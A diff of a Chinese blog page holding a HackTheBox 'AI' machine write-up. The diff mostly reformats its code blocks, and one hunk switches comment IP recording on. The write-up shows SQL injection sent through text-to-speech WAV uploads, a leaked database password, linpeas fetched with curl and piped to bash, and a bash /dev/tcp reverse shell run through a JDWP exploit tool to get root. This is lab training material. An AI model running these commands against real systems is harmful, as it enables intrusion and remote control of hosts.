@@ -471,67 +471,61 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p><strong>本机ip:10.10.15.60</strong></p>
 <p><strong>靶机ip:10.10.10.163</strong></p>
 <p>首先第一步当然是探测端口了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -sC -sV -oA ai 10.10.10.163</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a1.PNG" class="lazyload" data-srcset="a1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="nmap"></p>
+<pre><code>namp -sC -sV -oA ai 10.10.10.163</code></pre><p><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a1.PNG" class="lazyload" data-srcset="a1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="nmap"></p>
 <p>发现有22与80端口开放。既然有http服务，那就尝试直接访问吧。<br>有一个主页面。同时也发现了其他php文件，唯一比较有意思的就是下面这个<code>ai.php</code>页面，有一个文件上传点。<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a2.PNG" class="lazyload" data-srcset="a2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="ai"></p>
 <p>但是很奇怪。居然是<code>.wav</code>file。通常我所知道的文件上传点也就图片马或者phar反序列化或者其他类型的getshell。而它提示的drop your query using wav file.似乎是在说明我们可以进行查询操作。</p>
 <p>那么首先随便传一个test.php上去。内容随意。发现没有回显。<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a3.PNG" class="lazyload" data-srcset="a3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="test"></p>
 <p>看来是要<code>wav</code>的音频文件了。使用音频文件执行查询，这点真的难以弄懂。那么在尝试弄清漏洞类型之前先来目录爆破一下，看有没有什么别的信息：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;10.10.10.163 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -x php</span><br></pre></td></tr></table></figure>
-<p>基于这里都是php，我们在gobuster后着重加上<code>-x php</code>进行筛选。<br>解果大致如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php (Status: 200)</span><br><span class="line">&#x2F;contact.php (Status: 200)</span><br><span class="line">&#x2F;about.php (Status: 200)</span><br><span class="line">&#x2F;images (Status: 301)</span><br><span class="line">&#x2F;uploads (Status: 301)</span><br><span class="line">&#x2F;db.php (Status:301)</span><br><span class="line">&#x2F;intelligence.php(Status: 200)</span><br><span class="line">&#x2F;ai.php(Status: 200)</span><br></pre></td></tr></table></figure>
-<p>其中ai.php等等都是主页面就提供了的。新发现的页面包括<code>intelligence.php</code>跟<code>db.php</code>。上传跟图片界面我们都没有权限进去。那么访问下唯一可以访问的<code>intelligence.php</code><br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a4.PNG" class="lazyload" data-srcset="a4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="intelligence.php"></p>
+<pre><code>gobuster dir -u http://10.10.10.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php</code></pre><p>基于这里都是php，我们在gobuster后着重加上<code>-x php</code>进行筛选。<br>解果大致如下：</p>
+<pre><code>/index.php (Status: 200)
+/contact.php (Status: 200)
+/about.php (Status: 200)
+/images (Status: 301)
+/uploads (Status: 301)
+/db.php (Status:301)
+/intelligence.php(Status: 200)
+/ai.php(Status: 200)</code></pre><p>其中ai.php等等都是主页面就提供了的。新发现的页面包括<code>intelligence.php</code>跟<code>db.php</code>。上传跟图片界面我们都没有权限进去。那么访问下唯一可以访问的<code>intelligence.php</code><br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a4.PNG" class="lazyload" data-srcset="a4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="intelligence.php"></p>
 <p>发现了这个页面。似乎存在着词语的替换关系。从表的右列中我们不难找到一些熟悉的符号–<code>union</code>,<code>#</code>,<code>---</code>,<code>Schema</code>等等。这些都是常常出现在<strong>sql注入</strong>中的符号。结合我们还爆破出了db.php，可以猜想是否有sql注入的漏洞呢？</p>
 <p>答案是正确的。而且脑洞大开的是：我们要用语言转成音频文件上传来进行注入。这也许就是这个AI靶机的名字所在吧。</p>
 <p>首先google linux say command， 发现有这样的一个软件。叫做festival。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install festival</span><br></pre></td></tr></table></figure>
-<p>使用它其中一个叫text2wave的就能将语句转成语音文件。比如用下管道符，生成一个test.wav，内容为hello。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;Hello&quot;| text2wave -o test.wav</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a5.PNG" class="lazyload" data-srcset="a5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="test"></p>
+<pre><code>apt-get install festival</code></pre><p>使用它其中一个叫text2wave的就能将语句转成语音文件。比如用下管道符，生成一个test.wav，内容为hello。</p>
+<pre><code>echo &quot;Hello&quot;| text2wave -o test.wav</code></pre><p><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a5.PNG" class="lazyload" data-srcset="a5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="test"></p>
 <p>尝试听下这个音频，发现是个男低音（也许是机器合成音?）然后再次尝试上传<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a6.PNG" class="lazyload" data-srcset="a6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="hello"><br>发现input有结果，那么就尝试下翻译成英文来sql注入吧。<br>(这点对非英语母语的国家的人应该非常不友好……毕竟有些偏门的括号之类的英文我也不太熟）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">( openparenthesis 左括号</span><br><span class="line">) closeparenthesis 右括号</span><br><span class="line">- hyphen   连字符</span><br></pre></td></tr></table></figure>
-<p>基于一开始还探测到的<code>intelligence.php</code>中有些字符对应关系，不难想到我们需要使用那张表来绕过注入<br>比如我的尝试payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; union select database()---</span><br></pre></td></tr></table></figure>
-<p>需要换作</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open single quote, join select , database open parenthesis close parenthesis comment database</span><br></pre></td></tr></table></figure>
-<p>再重复上面生成test.wav的操作，就可以上传注入。<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a7.PNG" class="lazyload" data-srcset="a7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="database"></p>
+<pre><code>( openparenthesis 左括号
+) closeparenthesis 右括号
+- hyphen   连字符</code></pre><p>基于一开始还探测到的<code>intelligence.php</code>中有些字符对应关系，不难想到我们需要使用那张表来绕过注入<br>比如我的尝试payload</p>
+<pre><code>&#39; union select database()---</code></pre><p>需要换作</p>
+<pre><code>open single quote, join select , database open parenthesis close parenthesis comment database</code></pre><p>再重复上面生成test.wav的操作，就可以上传注入。<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a7.PNG" class="lazyload" data-srcset="a7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="database"></p>
 <p>基于hackthebox易得user的尿性，可以猜出一张users表然后爆出username跟password</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;union select username from user---</span><br><span class="line">open single quote, join , select , username from users comment database</span><br><span class="line">open single quote, join , select , password from users comment database</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a8.PNG" class="lazyload" data-srcset="a8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="username"><br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a9.PNG" class="lazyload" data-srcset="a9.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="password"></p>
+<pre><code>&#39;union select username from user---
+open single quote, join , select , username from users comment database
+open single quote, join , select , password from users comment database</code></pre><p><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a8.PNG" class="lazyload" data-srcset="a8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="username"><br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a9.PNG" class="lazyload" data-srcset="a9.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="password"></p>
 <p>显然，我们的http页面并没有什么让我们登录进去的方法或页面。基于之前的端口探测发现有ssh开放，不妨尝试ssh登录<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a10.PNG" class="lazyload" data-srcset="a10.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="ssh login"><br>成功登陆。并且user.txt就在当前目录下。</p>
 <p>之后就是常规提权的过程了。</p>
 <p>这里开始可能会想到之前没成功访问的db.php，在<code>/var/www/html</code>中爆出内容<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a11.PNG" class="lazyload" data-srcset="a11.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="mysql"><br>可知username为<code>dbuser</code>,password为<code>toor</code><br>进入mysql可用的就多了。（然而我进去的时候库被别人删了……）实际上可以爆出之前alexa所在user表的内容中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:root</span><br><span class="line">password:H,Sq9t6&#125;a&lt;)?q931</span><br></pre></td></tr></table></figure>
-<p>但是ssh登录并不成功。mysql这条路走不通。</p>
+<pre><code>username:root
+password:H,Sq9t6}a&lt;)?q931</code></pre><p>但是ssh登录并不成功。mysql这条路走不通。</p>
 <p>众所周知，发现提权的漏洞点并不是一件容易的事，尤其是对我这样的小白而言。所以，我从dalao视频那发现了一个很厉害的脚本可以解决我自己的漏洞认知问题。<br><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite" target="_blank" rel="noopener">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</a><br>在靶机上使用其中的<code>linpeas.sh</code>，脚本就会自动分析可能提权的漏洞点。着实解决不少问题。不过通常结果又臭又长，可能需要耐心找一找。<br>具体方法也很简单，本机git clone好后，起一个python监听（默认8000端口）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>
-<p>在靶机上直接curl后执行就好了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 10.10.15.60:8000&#x2F;linpeas.sh | bash</span><br></pre></td></tr></table></figure>
-
-<p>这里从linpeas.sh的结果中可以发现一个JDWP的点被标红了。<br>那么jdwp是什么呢？我们搜索一下</p>
+<pre><code>python -m SimpleHTTPServer</code></pre><p>在靶机上直接curl后执行就好了</p>
+<pre><code>curl 10.10.15.60:8000/linpeas.sh | bash</code></pre><p>这里从linpeas.sh的结果中可以发现一个JDWP的点被标红了。<br>那么jdwp是什么呢？我们搜索一下</p>
 <blockquote>
 <p>JDWP（Java DEbugger Wire Protocol）：即Java调试线协议，是一个为Java调试而设计的通讯交互协议，它定义了调试器和被调试程序之间传递的信息的格式。说白了就是JVM或者类JVM的虚拟机都支持一种协议，通过该协议，Debugger 端可以和 target VM 通信，可以获取目标 VM的包括类、对象、线程等信息</p>
 </blockquote>
 <p>而这是有漏洞利用的。比如知道创宇上的<br><a href="https://www.seebug.org/vuldb/ssvid-89216" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-89216</a></p>
 <p>等等，都是jdwp的代码执行漏洞。那么我们接下来就用这个漏洞，尝试拿到root权限。<br>首先确定使用的工具<br><a href="https://github.com/IOActive/jdwp-shellifier" target="_blank" rel="noopener">https://github.com/IOActive/jdwp-shellifier</a></p>
-<figure class="highlight plain"><figcaption><span>shell比较好。所以先在alexa的靶机的tmp目录下放一个反弹shell的脚本test.sh内容如下：</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.15.60&#x2F;9002 0&gt;&amp;1&#39;</span><br></pre></td></tr></table></figure>
-<p>然后给其执行的权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x test.sh</span><br></pre></td></tr></table></figure>
-<p>调用时只需：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;test.sh</span><br></pre></td></tr></table></figure>
-<p>先本机监听下，没有问题，可以弹到alexa的shell。</p>
+<p><code>jdwp-shellifier</code>(上面几个漏洞报告都是用的这个工具)之后考虑我们要执行的命令，当然是拿到root shell比较好。所以先在alexa的靶机的tmp目录下放一个反弹shell的脚本test.sh内容如下：</p>
+<pre><code>#!/bin/bash
+bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.15.60/9002 0&gt;&amp;1&#39;</code></pre><p>然后给其执行的权限</p>
+<pre><code>chmod +x test.sh</code></pre><p>调用时只需：</p>
+<pre><code>./test.sh</code></pre><p>先本机监听下，没有问题，可以弹到alexa的shell。</p>
 <p>接下来用到一个新学到的大招：端口转发。我们都知道，每次ssh登录这一靶机都要用户密码，十分麻烦。而且将要利用的jdwp是java的debug功能，据说操作时十分容易断开。那有没有什么方法可以本机处理这个jdwp呢？答案就是端口转发。原本自己以为十分复杂，但实际上并非如此。</p>
 <p>首先在靶机上确认jdwp是运行在8000端口的。<br>那么我先进入tomcat的目录，按下<code>~C</code>将直接进入ssh，然后将其转到localhost来研究</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-L 8000:localhost:8000</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a13.PNG" class="lazyload" data-srcset="a13.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="8000端口"></p>
+<pre><code>-L 8000:localhost:8000</code></pre><p><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a13.PNG" class="lazyload" data-srcset="a13.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="8000端口"></p>
 <p>这时我们在本机上使用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -lntp</span><br></pre></td></tr></table></figure>
-<p>查看主机监听的端口。就会发现8000端口处于监听状态了，user是ssh。我们也可以用同样的方法转发tomcat的8009和8080端口到本地，这样我们就能直接浏览器访问<code>localhost:8080</code>来分析tomcat（当然这里没有什么帮助）</p>
+<pre><code>ss -lntp</code></pre><p>查看主机监听的端口。就会发现8000端口处于监听状态了，user是ssh。我们也可以用同样的方法转发tomcat的8009和8080端口到本地，这样我们就能直接浏览器访问<code>localhost:8080</code>来分析tomcat（当然这里没有什么帮助）</p>
 <p>当然，这里转发到本地本来只是方便调试，因为可以直接在本地手动利用jdwp的漏洞，找到一个breakpoint用debug功能来执行命令。但是这方面实在不熟（java白学了），所以还是直接利用上面的脚本舒服啊。<br>shellifier用法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t 目标主机ip -p jdwp运行端口 --cmd &quot;Your Command&quot;</span><br></pre></td></tr></table></figure>
-<p>这里我们直接</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t 127.0.0.1 --break-on &quot;java.lang.String.indexOf&quot; --cmd &quot;&#x2F;tmp&#x2F;test.sh&quot;</span><br></pre></td></tr></table></figure>
-<p>因为转发了ip，端口所以使用的ip是本地。而break-on这点方便找出可以利用的断点。最后的cmd执行我们的反弹shell。<br>本机再度监听后执行这个脚本<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a14.PNG" class="lazyload" data-srcset="a14.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="root"><br>成功反弹shell到本机。即可拿到root.txt</p>
+<pre><code>python jdwp-shellifier.py -t 目标主机ip -p jdwp运行端口 --cmd &quot;Your Command&quot;</code></pre><p>这里我们直接</p>
+<pre><code>python jdwp-shellifier.py -t 127.0.0.1 --break-on &quot;java.lang.String.indexOf&quot; --cmd &quot;/tmp/test.sh&quot;</code></pre><p>因为转发了ip，端口所以使用的ip是本地。而break-on这点方便找出可以利用的断点。最后的cmd执行我们的反弹shell。<br>本机再度监听后执行这个脚本<br><img src="/2020/01/29/hackthebox-AI%E2%80%94%E2%80%94%E6%9C%89%E8%B6%A3%E7%9A%84sql-JDWPgetshell/a14.PNG" class="lazyload" data-srcset="a14.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="root"><br>成功反弹shell到本机。即可拿到root.txt</p>
 <p>感觉提权这方面自己还是不太熟悉，可能因为大部分ctf比赛注重的也只是getshell层面上的吧，之后的操作还要多加了解知识学习啊。</p>
 
   
@@ -725,7 +719,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -737,9 +731,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -872,6 +866,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1085,7 +1081,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1141,6 +1137,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
